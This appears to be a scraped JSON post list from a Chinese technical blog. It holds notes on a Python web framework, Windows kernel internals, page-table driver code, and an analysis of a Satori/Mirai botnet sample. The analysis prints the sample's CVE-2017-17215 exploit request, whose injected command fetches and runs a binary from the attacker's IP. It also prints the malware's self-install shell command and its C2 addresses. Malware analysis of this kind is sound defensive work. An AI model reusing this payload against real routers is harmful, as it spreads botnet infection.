项目地址：https://github.com/Joe1sn/muud 简单介绍 ​ 在毕业设计的时候，初始选题为《基于XMPP的即时通讯系统》，想的是自己照着RFC写一遍XMPP协议，但是时间不够（毕竟要上班）。所以把废案再利用，抽出其中的一些部分，从Socket到web框架，实现一个简单的CURD功能，锻炼一下自己的文档化编程能力。受我个人能力有限会随时断更，一路上只有vscode和chatGPT以及所需要的RFC文档。 ​ 再说说已实现的部分，首先是确定在Linux上运行的，使用python语言 使用epoll模型完成了部分HTTP服务器的功能 sqlalchemy完成了数据库的ORM实现 路由通过闭包完成 视图部分编写（只考虑JSON传递） 启动部分参考了Django的设计 最后运行的效果 需求分析 根据ChatGPT，一个典型的Python Web框架通常由以下几个核心组件组成： 路由（Routing）：路由用于将传入的HTTP请求映射到相应的处理程序或视图函数上。它确定了不同URL路径与应用程序中的不同功能点之间的关联关系。 视图（Views）：视图是处理HTTP请求并生成HTTP响应的函数或方法。它们接收来自路由的请求并执行相应的逻辑，最后返回响应给客户端。 模板引擎（Template Engine）：模板引擎允许开发者将静态模板和动态数据结合，生成最终的HTML响应。模板引擎通常支持模板语法、变量替换、条件判断、循环等功能，以简化动态内容的生成。 中间件（Middleware）：中间件是位于请求和视图之间的组件，用于在请求到达视图之前或响应返回客户端之前执行一些通用的功能。中间件可以处理身份验证、请求预处理、错误处理等任务。 数据库访问（Database Access）：Web框架通常提供了对数据库的支持，以便应用程序可以与数据库进行交互。这包括连接数据库、执行查询和操作、ORM（对象关系映射）等功能。 表单处理（Form Handling）：Web应用程序通常需要处理用户提交的表单数据。框架提供了表单验证、数据绑定、错误处理等功能，使开发者可以方便地处理表单数据。 身份验证与授权（Authentication and Authorization）：身份验证用于验证用户的身份，而授权则用于确定用户是否有权限执行特定操作。框架通常提供了身份验证和授权的支持，以便开发者可以轻松实现用户认证和授权功能。 测试框架（Testing Framework）：测试框架用于编写和执行自动化测试，以确保应用程序的正确性和稳定性。它提供了测试用例的编写、运行和断言等功能。 后来的项目像参考Django的设计 目前项目缺少的： 模板渲染：设计的时候考虑到前后端分离是开发，没有想过渲染 中间件：完全没有设计 表单处理：完全没有设计 测试框架：还在学 对于Django这样的框架来说，开启一个项目后， 123456789101112131415161718.├── 开启的app名称│ ├── admin.py│ ├── apps.py│ ├── __init__.py│ ├── migrations│ ├── models.py│ ├── tests.py│ └── views.py├── 项目名称│ ├── asgi.py│ ├── __init__.py│ ├── settings.py│ ├── urls.py│ └── wsgi.py├── manage.py├── static└── templates views.py是视图、models.py是ORM对象、asgi.py\\wsgi.py是HTTP服务、setting.py是设置、url.py是路由，项目从manage,py开始，那么就可以整理一下原来的代码了。 那么目前项目的结构 1234567891011121314151617181920212223├── config│ ├── client.conf│ ├── database.conf │ ├── server.conf│ ├── server.crt│ ├── server.csr│ └── server.key├── manage.py├── README.md├── requirements.txt├── rprint.py├── server│ ├── db.py│ ├── models.py │ ├── serialization.py│ ├── server.py│ ├── urls.py│ ├── utils│ │ ├── autoreload.py│ │ ├── epollcontrol.py│ │ ├── functional.py│ └── views.py└── test config 包含数据库配置(database.conf)，SSL使用的证书(server.csr)和key(server.key)，socket服务配置(server.conf) utils 一些帮助模块 server 主要功能实现，包括路由、epoll管理、数据库相关，其中views.py可以编写api，urls.py中设置路由 test 一些测试用例 目前应该专注于第一块：优化epoll性能以及wsgi、asgi的实现。","categories":[{"name":"program","slug":"program","permalink":"https://joe1sn.eu.org/categories/program/"}],"tags":[{"name":"muud","slug":"muud","permalink":"https://joe1sn.eu.org/tags/muud/"},{"name":"web framework","slug":"web-framework","permalink":"https://joe1sn.eu.org/tags/web-framework/"}]},{"title":"【win内核原理与实现】I. Windows系统结构","slug":"windows-kernel-1-baisc","date":"2023-05-24T03:28:39.000Z","updated":"2025-01-26T14:46:00.752Z","comments":true,"path":"2023/05/24/windows-kernel-1-baisc/","link":"","permalink":"https://joe1sn.eu.org/2023/05/24/windows-kernel-1-baisc/","excerpt":"Windows系统结构还有引导过程","text":"Windows系统结构还有引导过程 I.a 大致结构 windows内核是从windows NT内核发展过来的，从开始就和硬件的发展息息相关。 Windows采用双模式（dual mode）结构来保护操作系统内核不受应用程序的错误而出现崩溃 windows的原始设计是一个支持多环境子系统的os，它还支持POSIX和OS/2环境子系统.为他们提供仿真执行环境 I.b windows内核组成结构 关于函数的开头 nt：内核提供的服务 Ldr：映像加载器函数 Csr：Windows子进程通讯函数 Dbg：调试函数 Etw：系统时间函数 Rtl：运行支持函数 执行体API函数接收的参数来自各种应用程序，通常会在程序的最开始处，对所接受的参数逐一探查他们的可访问性。 II. windows内核关键组件 HAL 硬件抽象层 HAL通常是一个独立的动态链接库，windows自身携带多种HAL，但是在系统安装的时候只会选择一种，改名为hal.dll。涉及中断控制器、单处理器/多处理器硬件断点。 内核（微内核） 在内核模块ntoskrnl.exe中的上层部分为执行体，下层最接近HAL的就是内核。负责进程调度、中断和异常处理，核心任务是尽可能让系统中的所有处理器变得高效。 windows内核使用抢占式调度，由于采用面向对象的设计，使得它主要面向两个对象：分发器 和 控制 两个对象 分发器对象：实现各种同步功能。影响线程调度，主要用于 事件(event) 突变体(mutant) 信号量(semaphore) 进程(process) 线程(thread) 队列(query) 门(gate) 定时器(timer) 控制对象：用于控制内核的操作，不影响线程调度。包括 异步调用(APC) 延迟过程调用(DPC) 中断对象 执行体 在内核模块ntoskrnl.exe中的上层部分，包含5种类型的函数 被导出的、可以在用户模式下调用的函数。位于 ntdll.dll 中。一般就是win API 没有被导出、可以在用户模式下调用的函数。比如常见的反调试函数，包括各种LRC(Local Process Call，本地调用过程)、各种查询函数和专业函数。 只能在内核模式下调用的导出函数。在windows DDK中有文档。 执行体之间内部调用，未被文档化的函数 一个组件的内置函数 其中组件包括 进程和线程管理器：负责进程/线程的CURD 内存管理：虚拟内存 安全引用监视器（SRM）：维护本地计算机的安全策略 I/O管理器 缓存管理器：允许磁盘将文件映射到内存中 配置管理器：负责注册表的实现 即插即用管理器 还有的函数负责对执行体进行管理 对象管理器：执行体对象的CURD LPC设施：负责同一设备的的客户进程和服务进程的消息传递，对应的是远程过程调用（RPC） 运行时库函数 执行体支持例程：内存的分配、互锁内存的转换 设备驱动程序 驱动文件（.sys），漏洞挖掘存在于IOCTL 文件系统/存储管理 主要是ntfs.sys。漏洞挖掘存在于CLFS（通用日志文件系统）。 网络 windows套接字、winInet、NetBIOS、RPC III. windows子系统 在上面的内核部分已经实现了对硬件的简单访问控制，那么就会在次基础上进行跟高层次的建设。 在PE文件的头部域Subssytem中指定了该程序会在那个子环境中运行。 子系统也分为用户模式和内核模式，核心部分是 win32k.sys。子系统的DLL链接到应用程序中，包括kernel32.dll user32.dll gdi32.dll advapi.dll，负责实现文档化的windows函数。 win32k.sys同时也负责向内核注入一系列出调函数(callout)，一旦调用了win32k.sys的任何一个系统服务，这个程序就会变成一个GDI线程 核心功能可以分为： 窗口管理 由windows子进程csrss.exe负责控制台窗口功能 1234子系统会话---&gt;交互式窗口站---&gt;默认桌面---&gt;顶级窗户口列表-&gt;子窗口 | |_&gt;登录窗口 | |_&gt;屏幕保护窗口 |-&gt;非交互式窗口--&gt;不可见桌面 图形设备接口(GDI) 主要是图形支持，设计Direct3D等 IV. 安全性管理 三个核心组件：winlogon、SRM 和 lsass winlogon 和 lsass 是两个用户模式进程， 而 SRM 是 Windows 执行体中的组件 SRM（Security Reference Monitor安全引用监视器），负责执行对象的安全访问检查、管理用户特权、生成安 全审计消息，并且定义了访问令牌数据结构来表示一个安全环境。 Winlogon，负责响应 SAS（安全注意序列），以及管理交互式登录会话。当用户登 录到系统中时，winlogon 创建一个初始进程，并进一步由它创建外壳（shell）进程。 Lsass（Local Security Authentic SubSystem本地安全权威子系统），负责本地系统的安全策略，同时，它也认证用户的 身份，以及将安全审计消息发送到系统的事件日志中。 SAM（安全账户管理器）数据库，包含了本地用户和用户组，以及它们的口令和其 他属性。它位于注册表的 HKLM\\SAM 下面。由于 HKLM\\SAM 键只允许本地系统账 户访问，所以，除非用户在 Local System 账户下运行 regedit.exe 工具，否则无法访问 HKLM\\SAM 子树。 LSA 策略数据库，包含了有关当前系统的一些信息，譬如谁允许访问系统以及如何 访问（交互式登录、网络登录或者以服务方式登录）；分配给谁哪些特权；安全审计 如何进行等。如同 SAM 数据库一样，LSA 策略数据库也存储在注册表中，位于 HKLM\\SECURITY 下面。同样地，除了 Local System 账户以外的其他账户均无法访 问 HKLM\\SECURITY 子树。 winlogon 负责系统登录，包括对用户身份的认证；lsass 负责管理系统本地安全策略，并且将这些策略通知到内核中的 SRM。在内核 中，SRM 负责实现基于对象的访问控制以及系统全局安全策略的实施。 关于一些提权 在 Windows 中，特权是由 LUID 对象来标识的，LUID 代表一个本地唯一标识符（Locally Unique Identifier） 12345678typedef struct _LUID_AND_ATTRIBUTES &#123; LUID Luid; ULONG Attributes; &#125; LUID_AND_ATTRIBUTES, * PLUID_AND_ATTRIBUTES; #define SE_PRIVILEGE_ENABLED_BY_DEFAULT (0x00000001L) #define SE_PRIVILEGE_ENABLED (0x00000002L) #define SE_PRIVILEGE_REMOVED (0X00000004L) #define SE_PRIVILEGE_USED_FOR_ACCESS (0x80000000L) Windows 内核中定义了一组特权，即类型为 LUID 的 Se全局变量。Windows 内核中，与安全相关的函数以“Se”作为前缀，有一些安全函数还存在对应的系 统服务。这些系统服务函数的名称以“Nt”作为前缀，后面部分与“Se”函数相同。 V. Windows的引导过程 最开始也是从经典的MBR开始，然后是ntldr的osloader。 在osloader中将物理地址转为虚拟地址，该过程可见：windows_kernel_driver_2中对CR3、CR4寄存器的控制。 之后osloader加载NTDETECT.COM程序，利用系统BIOS查询系统基本设备，在引导过程的后期被存放到注册表 HKLM\\HARDWARE\\DESCRIPTION os loader 加载内核模块映像文件，默认为 ntoskrnl.exe，以及 HAL 映像文件，默 认为 hal.dll。再加载注册表的 SYSTEM 储巢，即\\WINDOWS\\system32\\config\\system 文件。 然后是内核的初始化，此入口函数为 KiSystemStartup 为了解决在初始化过程中的相互依赖 性问题，内核的初始化分两个阶段进行，称为阶段 0 和阶段 1。大多数内核组件的初始化函 数相应地带有一个整数参数，以指明一次调用是阶段 0 初始化还是阶段 1 初始化，而有些组 件的初始化函数通过检查一个全局变量 InitializationPhase 的值来判断当前处于哪个阶段。 阶段 0 初始化的目的是，将阶段 1 初始化所要用到的基 本数据结构建立起来。这时中断被禁止，调整IDT、TSS、PCR等。接着调用 KiInitializeKernel 函数，执行内核初始化。最后，当前线程蜕变成一个空闲线程。 V. Windows发布历史 MicroSoft在操作系统领域中最开始起源于MS-DOS，随后演变出了两个分支，最开始的Win 95/98/Me，之后就是基于Windows NT的内核版本的Window XP/7/8/10/vista的版本。 版本 发布日期 主要特点 内核版本 Windows 1.0 1985年11月 初始版本，提供基本的图形用户界面和应用程序支持 1.0 Windows 2.0 1987年12月 引入了窗口重叠、图标和键盘快捷键等改进 2.0 Windows 3.0 1990年5月 支持多任务处理和TrueType字体，用户界面大幅改进 3.0 Windows 95 1995年8月 具有开始菜单、任务栏和32位应用程序支持的重要版本 4.0 Windows 98 1998年6月 引入了对USB设备和DVD光盘的支持，改进了系统稳定性 4.10 Windows 2000 2000年2月 强化了系统稳定性和安全性，提供了企业级特性 5.0 Windows XP 2001年10月 引入了全新的用户界面、系统恢复功能和多用户支持 5.1 Windows Vista 2007年1月 全新的用户界面、更高的安全性和系统稳定性 6.0 Windows 7 2009年10月 优化了用户界面和性能，改进了任务栏和窗口管理 6.1 Windows 8 2012年10月 引入了全新的开始屏幕和触摸优化的用户界面 6.2 Windows 10 2015年7月 统一了桌面和移动设备平台，引入了Windows应用商店 10.0 Windows 11 2021年10月 新的用户界面设计、改进的性能和安全性，支持Android应用 10.0","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"kernel","slug":"notes/kernel","permalink":"https://joe1sn.eu.org/categories/notes/kernel/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"}]},{"title":"Mirai Botnet分支Satori分析","slug":"mirai-bota","date":"2023-03-25T10:42:45.000Z","updated":"2025-01-26T14:46:00.784Z","comments":true,"path":"2023/03/25/mirai-bota/","link":"","permalink":"https://joe1sn.eu.org/2023/03/25/mirai-bota/","excerpt":"暂时先更新这么多，后面应该还有相关作者被抓的一些消息和更多功能的逆向","text":"暂时先更新这么多，后面应该还有相关作者被抓的一些消息和更多功能的逆向 基本情况 名称 x86_64 MD5 fe7ca3b588e342f79c7814bb75dc24d7 SHA256 e436196f047741070c580695f5444e0c2cdd175c88f68affdc9230d09a71c978 Domain botnet.nguyennghi.info ip 103.183.118.73 逆向分析 基本情况 64位ELF可执行文件 逆向工程 通过start找到main函数 使用IDApython脚本对类似的库函数实现进行函数重命名 1234567891011121314151617181920import idautilsimport idaapiimport ida_nameimport idcfor func_ea in idautils.Functions(): func = idaapi.get_func(func_ea) name = idaapi.get_func_name(func_ea) for head in idautils.Heads(func.start_ea, func.end_ea): try: code = idc.GetDisasm(head) if &quot;syscall&quot; in code: print(&quot;Function: &#123;&#125;&quot;.format(name).ljust(0x40,&#x27;-&#x27;)) print(code[21:].ljust(0x30,&quot;=&quot;)) ida_name.set_name(func.start_ea, code[21:]) idc.set_func_flags(func.start_ea, idc.get_func_flags(func_ea) | idaapi.FUNC_LIB) except: pass main函数 首先创建向8.8.8.8:13568的socket连接，通过getsockname测试网络是否连通并获得本机ip地址 初始化加密消息 由于使用未知版本的lib库进行静态编译，所以需要手动识别一些lib函数。 比如这里使用malloc分配并将密文使用strncpy将消息复制到堆中 利用pid和随机数进行随机数生成，对进程进行随机改名 将time生成的伪随机数和pid进行异或等操作得到随机数 通过位移等操作实现随机数的范围控制 在之后使用ptrcl进行进程的重命名 拼接指令过后，修改相关信号变量值，并在vfork的execl中执行 拼接命令字符串 设置信号量并使用vfork执行 vfork部分 执行的语句为 1/bin/sh sh -c rm -rf $root_random_name &amp;&amp; mkdir bin; &gt; $cur_random_name &amp;&amp; mv $pwd $root_random_name ; chmod 777 $root_random_name 例如 1/bin/sh sh -c rm -rf bin/watchdog &amp;&amp; mkdir bin \\336\\377\\377\\377\\177; &gt;bin/watchdog &amp;&amp; mv /home/test/Desktop/HackedByAlan/check/mirai bin/watchdog; chmod 777 bin/watchdog 随机选择 &quot;/bin/busybox&quot;;、&quot;/bin/watchdog&quot;、&quot;/bin/systemd&quot;中的一个（$root_random_name）中的一个删除 当前文件夹创建bin目录 将当前目录下的病毒移动至创建的bin目录中，并重命名$root_random_name 给予bin/$root_random_name最高权限 通过多次运行可以成功实现，如果&amp;&amp; mkdir bin \\336\\377\\377\\377\\177中没有乱码，那么就会执行后一句 使用异或解密字符串并打印，完成后加密字符串 过程 利用其自身的解密脚本，可以解密所有密文 1234567891011121314151617181920212223242526str1 = [ 0x4C, 0x41, 0x5A, 0x40, 0x4B, 0x5A, 0x00, 0x40, 0x49, 0x5B, 0x57, 0x4B, 0x40, 0x40, 0x49, 0x46, 0x47, 0x00, 0x47, 0x40, 0x48, 0x41, 0x2E]str2 = [0x4A, 0x41, 0x40, 0x4B]str3 = [0x01, 0x5E, 0x5C, 0x41, 0x4D, 0x01, 0x2E]str4 = [0x01, 0x4B, 0x56, 0x4B, 0x2E]str5 = [0x01, 0x48, 0x4A, 0x2E]str6 = [0x01, 0x4D, 0x43, 0x4A, 0x42, 0x47, 0x40, 0x4B, 0x2E]key = 0x6D53D2C2def decrypt(cipher:list): v3 = key &amp; 0xFF v4 = key &gt;&gt; 8 v5 = (key &gt;&gt; 16) &amp; 0xFFFF v6 = (key &gt;&gt; 24) &amp; 0xFF result = &quot;&quot; for i in cipher: result += chr((i^v3^v4^v5^v6 )&amp; 0xFF) return resultif __name__ == &#x27;__main__&#x27;: print(&quot;1&quot;, decrypt(str1)) print(&quot;2&quot;, decrypt(str2)) print(&quot;3&quot;, decrypt(str3)) print(&quot;4&quot;, decrypt(str4)) print(&quot;5&quot;, decrypt(str5)) print(&quot;6&quot;, decrypt(str6)) 加密字符串，由于是异或加密，所以加解密算法一致 合适函数表，讲函数放到一个table中 使用fork获得子进程，打开/proc文件夹并读取其中的文件，关闭除必要进程外的所有进程 打开/proc/文件夹 关闭除必要进程外的所有进程 使用SSDP协议进行网络发包，使用华为HG532远程命令执行漏洞（CVE-2017-17215）的payload进行发包，进行攻击 进行攻击 创建socket 设置 socket 选项，允许向组播地址发送数据 设置目标地址和端口号 构造 M-SEARCH 请求报文，发送搜索请求 payload分析 12345678910111213141516POST /ctrlt/DeviceUpgrade_1 HTTP/1.1Connection: keep-aliveAccept: */*Authorization: Digest username=&quot;dslf-config&quot;, realm=&quot;HuaweiHomeGateway&quot;, nonce=&quot;88645cefb1f9ede0e336e3569d75ee30&quot;, uri=&quot;/ctrlt/DeviceUpgrade_1&quot;, response=&quot;3612f843a42db38f48f59d2a3597e19c&quot;, algorithm=&quot;MD5&quot;, qop=&quot;auth&quot;, nc=00000001, cnonce=&quot;248d1a2560100669&quot;Content-Length: 457&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt; &lt;s:Body&gt; &lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt; &lt;NewStatusURL&gt;$(/bin/busybox wget -g 103.183.118.73 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)&lt;/NewStatusURL&gt; &lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt; &lt;/u:Upgrade&gt; &lt;/s:Body&gt;&lt;/s:Envelope&gt; 核心语句 /bin/busybox wget -g 103.183.118.73 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei 网络连接相关 DNS SERVER anuj.ns.cloudflare.com. 173.245.59.65 anuj.ns.cloudflare.com CLOUDFLARENET United States raphaela.ns.cloudflare.com. 108.162.194.192 raphaela.ns.cloudflare.com CLOUDFLARENET United States Host Records (A) nguyennghi.info HTTP: cloudflare 104.21.78.122 CLOUDFLARENET unknown antiddos.nguyennghi.info 103.161.181.140 DVS-AS-VN VIET DIGITAL TECHNOLOGY LIABILITY COMPANY Vietnam checkht4gvpn.nguyennghi.info HTTP: cloudflare 172.67.220.248 CLOUDFLARENET United States","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/tags/notes/"},{"name":"git","slug":"git","permalink":"https://joe1sn.eu.org/tags/git/"}]},{"title":"windows内核驱动 2-页表探索","slug":"windows_kernel_driver_2","date":"2023-02-17T07:21:36.000Z","updated":"2025-01-26T14:46:00.748Z","comments":true,"path":"2023/02/17/windows_kernel_driver_2/","link":"","permalink":"https://joe1sn.eu.org/2023/02/17/windows_kernel_driver_2/","excerpt":"探索CR4 探索页面 CR3寄存器于页遍历 虚拟地址-&gt;物理地址","text":"探索CR4 探索页面 CR3寄存器于页遍历 虚拟地址-&gt;物理地址 [驱动开发]探索CR4 英特尔® 64 位和 IA-32 架构开发人员手册合订本 第3卷第四章第五小节《4-LEVEL PAGING AND 5-LEVEL PAGING》 判断CPU是四级分页还是五级分页 page: 3074 该寄存器的值决定了映射层级是4/5， 1：5级分页 0：4级分页 12345678//__readcr4() &amp; 0x1000//__readcr4() &amp; (1&lt;&lt;12)CR4 Cr4 = &#123; .Value = __readcr4() &#125;;DbgPrint(&quot;CR4=0x%016I64X, CR4.LA57=%I64d\\n&quot;, Cr4.Value, Cr4.Fields.LA57);if (Cr4.Fields.LA57) DbgPrint(&quot;The system using 5 Level Paging&quot;);else DbgPrint(&quot;The system using 4 Level Paging&quot;); [驱动开发]探索页面 CR3寄存器于页遍历 CR3 寄存器设计 CR3[512][512][512][512] 个人觉得这块儿和CSAPP上面讲的差不多 页号=页首地址页大小=页首地址4KB==页首地址212==页首地址&gt;&gt;12页号 = \\frac{页首地址}{页大小}= \\frac{页首地址}{4KB}== \\frac{页首地址}{2^{12}}== 页首地址&gt;&gt;12页号=页大小页首地址​=4KB页首地址​==212页首地址​==页首地址&gt;&gt;12 12345678910111213//1.得到CR3寄存器的值，从而得到一级页表地址CR3 Cr3 = &#123; .Value = __readcr3() &#125;;//2.对每一个一级页读取PL1PTE L1pt = MmGetVirtualForPhysical(L1ptPa.AsLargeInteger);for (int n1 = 0; n1 &lt; 512; n1++) &#123; if (!L1pt[n1].Fields.P || !L1pt[n1].Fields.U_S) continue; PA L2ptPa = &#123; .Fields4KB.PPN = L1pt[n1].Fields.PPN &#125;; DbgPrint(&quot;...&quot;); //3.得到二级页表地址 PL2PTE L2pt = MmGetVirtualForPhysical(L2ptPa.AsLargeInteger); //4.类似嵌套循环，遍历 CR3的PPN是第12位，共40bit，所以一级页表是这个值。CR3的尾12位没有用全为0，同时24=162^{4} = 1624=16，那么向右移12位等效于16禁止右移124=3\\frac{12}{4}=3412​=3位 得到Level_1_PageTable的值过后，可以使用函数MmGetVirtualForPhysical获得该内存地址的值，从而遍历一级页表。要判断当前L1pt.P是否有效，同时L1pt.U_S可以判断该页的权限，详细可以看开发者手册 Table 4-20 依次循环可以遍历完整个内存页（下图中L4pt放不下了） 虚拟地址-&gt;物理地址 程序按照4KB分页个数太多不利于实验，可以强制将其分页为1GB，这样便于翻译 编写一个测试程序，该程序能申请出一页的内存，并打印其值 使用PsGetCurrentProcess获得当前进程PROCESS对象，若相等则不启用新方法 使用KeStackAttachProcess附加到要翻译的内存的PROCESS对象中，使用老方法输出就OK了，最后KeUnstackDetachProcess脱离 ?如何使用按照名字查找进程 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &quot;win10.h&quot;NTSTATUSQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID* SystemInformation)&#123; NTSTATUS Status; PVOID Buffer; ULONG BufferSize = 4096; do &#123; Buffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, BufferSize, &#x27;bisQ&#x27;); if (!Buffer) return STATUS_NO_MEMORY; Status = NtQuerySystemInformation(SystemInformationClass, Buffer, BufferSize, &amp;BufferSize); if (NT_SUCCESS(Status)) &#123; *SystemInformation = Buffer; return Status; &#125; ExFreePool(Buffer); if (STATUS_INFO_LENGTH_MISMATCH != Status) return Status; &#125; while (TRUE);&#125;NTSTATUSLookUpProcessByImageName(PCWSTR ImageName, PEPROCESS* Process)&#123; NTSTATUS Status; PSYSTEM_PROCESS_INFORMATION ProcessInformationArray = NULL; Status = QuerySystemInformation(SystemProcessInformation, &amp;ProcessInformationArray); if (!NT_SUCCESS(Status)) return Status; PSYSTEM_PROCESS_INFORMATION CurrentInformation = ProcessInformationArray; UNICODE_STRING ImageNameUnicodeString; RtlInitUnicodeString(&amp;ImageNameUnicodeString, ImageName); while (TRUE) &#123; if (RtlCompareUnicodeString(&amp;CurrentInformation-&gt;ImageName, &amp;ImageNameUnicodeString, FALSE) == 0) &#123; Status = PsLookupProcessByProcessId(CurrentInformation-&gt;UniqueProcessId, Process); ExFreePool(ProcessInformationArray); return Status; &#125; if (CurrentInformation-&gt;NextEntryOffset == 0) &#123; ExFreePool(ProcessInformationArray); return STATUS_NOT_FOUND; &#125; CurrentInformation = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)CurrentInformation + CurrentInformation-&gt;NextEntryOffset); &#125;&#125; 大致思路和win32下按名称查找PID差不多 具体过程 这里以0x00000254000003BC Str1 为例子，加载插件打印，耐心等待。。。 这时候的数据大小就有83KB了 format(0x00000254000003BC, &quot;064b&quot;)，内存前16位为空是没有用的 高9位 VPN1=4VPN1=4VPN1=4 int(format(0x00000254000003BC, &quot;064b&quot;)[16:][:9],2) 再9位 VPN2=336VPN2=336VPN2=336 int(format(0x00000254000003BC, &quot;064b&quot;)[16:][9:18],2) 该页表的PS=1，则不需要查找下一个页表了（而且后面也没有了） 得到的Pa就是物理页的首地址 + 剩余的30bit位作为VPO = 物理地址 hex(0x00000001C0000000+int(format(0x00000254000003BC, &quot;064b&quot;)[16:][18:],2)) 得到PA+VPO = 0x1c00003bc 暂停系统，Windbg -&gt; memory window -&gt; 右键 -&gt; proeries -&gt; physical memory 尝试修改 再次刷新应该就是1234了 成功修改 官方文档 2938/4834","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"kernel","slug":"notes/kernel","permalink":"https://joe1sn.eu.org/categories/notes/kernel/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"}]},{"title":"windows内核驱动 1-环境搭建","slug":"windows_kernel_driver_1","date":"2023-02-16T04:07:43.000Z","updated":"2025-01-26T14:46:00.752Z","comments":true,"path":"2023/02/16/windows_kernel_driver_1/","link":"","permalink":"https://joe1sn.eu.org/2023/02/16/windows_kernel_driver_1/","excerpt":"简而言之就是 visual stdio 2019 windows SDK windows WDK 如果vs没有kernel的项目的模板，找到vs目录的WDK.vsix即可","text":"简而言之就是 visual stdio 2019 windows SDK windows WDK 如果vs没有kernel的项目的模板，找到vs目录的WDK.vsix即可 关于调试 windbg调试器 同时windows 虚拟机我使用的是 vmware，添加了一个COM串口 加载驱动 使用KmdKit windows设置 msconfig -&gt; 调试 -&gt; COM2 … 最简单的hello world 打开vs，找到KMDF （kernel mode driver empty） 设置驱动项目 取消晚上12点后编译报错 项目 -&gt; 属性 -&gt; Inf2Cat -&gt; Use Local Time 代码 main.c 12345678910111213141516171819202122#include &lt;ntifs.h&gt;// 驱动卸载函数VOIDDriverUnload(PDRIVER_OBJECT DriverObject)&#123; UNREFERENCED_PARAMETER(DriverObject); DbgPrint(&quot;Bye\\n&quot;);&#125;// 驱动入口函数// System 在内核模式下运行该函数NTSTATUSDriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)&#123; UNREFERENCED_PARAMETER(RegistryPath); //宏防止编译器报错 DbgPrint(&quot;Hello World!\\n&quot;); //调式输出 DriverObject-&gt;DriverUnload = DriverUnload; //驱动卸载函数 return STATUS_SUCCESS; //加载成功返回码&#125; Class改为 Class=System ClassInstall32 直接删除两行（就是直接把这个属性删除了） 使用加载器加载 使用KmdManager 使用windbg x64调试 File -&gt; Kernel Debug F5继续过后在虚拟机里面运行","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"kernel","slug":"notes/kernel","permalink":"https://joe1sn.eu.org/categories/notes/kernel/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"}]},{"title":"操作系统实现-合集1","slug":"os-allinone","date":"2022-08-24T12:00:00.000Z","updated":"2025-01-26T14:46:00.784Z","comments":true,"path":"2022/08/24/os-allinone/","link":"","permalink":"https://joe1sn.eu.org/2022/08/24/os-allinone/","excerpt":"代码来源：https://github.com/StevenBaby/onix 相关课程：https://www.bilibili.com/video/BV1gR4y1u7or 感谢B站UP：踌躇月光 带来的相关代码和教程 后来觉得操作系统从0到1这样学是一个非常蠢得概念，因为每个人学习他应该是有重点地。对系统有个基础的认知后，就该去精通自己要专注的方向，比如内存管理、网络协议等 也有可能你只是为了面试，但是面试也是有重点的对吧 所以把之前的文章做一个合集，喜欢在认识系统后再在方面创造子系统","text":"代码来源：https://github.com/StevenBaby/onix 相关课程：https://www.bilibili.com/video/BV1gR4y1u7or 感谢B站UP：踌躇月光 带来的相关代码和教程 后来觉得操作系统从0到1这样学是一个非常蠢得概念，因为每个人学习他应该是有重点地。对系统有个基础的认知后，就该去精通自己要专注的方向，比如内存管理、网络协议等 也有可能你只是为了面试，但是面试也是有重点的对吧 所以把之前的文章做一个合集，喜欢在认识系统后再在方面创造子系统 [操作系统实现]基础篇 CPU中的段寄存器 CS (Code Segment Register)：代码段的段基址 DS(Data Segment Register)：数据段的段基址 ES(Extra Segment Register)：其值为附加数据段的段基值，称为“附加”是因为此段寄存器用途不像其他 sreg 那样固定，可以额外做他用。 FS(Extra Segment Register)：其值为附加数据段的段基值 GS：同上 SS(Stack Segment Register)：堆栈段寄存器 在实模式中，CS、DS、ES、SS中的值是物理地址 在保护模式中，装入寄存器的是段选择子 BIOS DOS Linux中断的区别 BIOS、DOS都是在 实模式 中运行，有内部中断向量表(Interrupt Vector Table IVT)建立，用过INT掉用实现 BIOS 中断调用的主要功能是提供了硬件访问的方法，该方法使对硬件的操作变得简单易行 BIOS 在运行期间会扫描 0xc0000 0xe0000 之间的内存，若在某个区域发现前两个 节是 Ox55 OxAA 时，这意味着该区域对应的 rom 中有代码存在，再对该区域做累加和检查，若结果与第3个字节的值相符，说明代码无误，就从第4个字节进入 Linux 内核是在进入保护模式后才建立中断例程的，不过在保护模式下，中断向量表己经不存在了， 取而代之的是中断描述符表(Interrupt Descriptor Table, IDT)。 Linux 是通过 int 0x80 指令进入一个中断程序后再根据 缸寄存器的值来调用不同的子功能函数的 Section与Segment的区别 section 称为节，是指在汇编源码中经由关键字 section segment 修饰、逻辑划分的指令或数据区域， 汇编器会将这两个关键字修饰的区域在目标文件中编译成节，也就是说“节”最初诞生于目标文件中 segment 称为段，是链接器根据目标文件中属性相同的多个 section 合并后的 section 集合，这个集合 称为 segment ，也就是段，链接器把目标文件链接成可执行文件，因此段最终诞生于可执行文件中 